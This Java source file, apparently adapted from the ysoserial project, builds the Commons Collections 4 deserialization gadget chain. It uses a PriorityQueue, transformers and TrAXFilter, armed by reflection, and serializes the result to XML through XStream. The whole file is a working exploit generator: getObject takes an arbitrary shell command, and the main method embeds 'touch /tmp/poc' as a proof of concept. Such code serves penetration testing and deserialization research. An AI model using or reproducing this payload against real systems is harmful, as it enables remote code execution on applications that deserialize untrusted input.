import java.util.PriorityQueue;
import java.util.Queue;

import javax.xml.transform.Templates;

import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ChainedTransformer;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;

import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;

import com.thoughtworks.xstream.XStream;

/*

	Majority of source code borrowed from @frohoff ysoserial project
	https://github.com/frohoff/ysoserial

	Original gadget by: @frohoff

*/

public class CommonsCollections4{

	public Queue<Object> getObject(final String command) throws Exception {
		Object templates = Gadgets.createTemplatesImpl(command);

		ConstantTransformer constant = new ConstantTransformer(String.class);

		// mock method name until armed
		Class[] paramTypes = new Class[] { String.class };
		Object[] args = new Object[] { "foo" };
		InstantiateTransformer instantiate = new InstantiateTransformer(
				paramTypes, args);

		// grab defensively copied arrays
		paramTypes = (Class[]) Reflections.getFieldValue(instantiate, "iParamTypes");
		args = (Object[]) Reflections.getFieldValue(instantiate, "iArgs");

		ChainedTransformer chain = new ChainedTransformer(new Transformer[] { constant, instantiate });

		// create queue with numbers
		PriorityQueue<Object> queue = new PriorityQueue<Object>(2, new TransformingComparator(chain));
		queue.add(1);
		queue.add(1);

		// swap in values to arm
		Reflections.setFieldValue(constant, "iConstant", TrAXFilter.class);
		paramTypes[0] = Templates.class;
		args[0] = templates;

		return queue;
	}

	public static void main(final String[] args) throws Exception {
		CommonsCollections4 c = new CommonsCollections4();
		Object obj = c.getObject("touch /tmp/poc");

		XStream xStream = new XStream();
		String xml = xStream.toXML(obj);                
		System.out.println(xml);
	}
}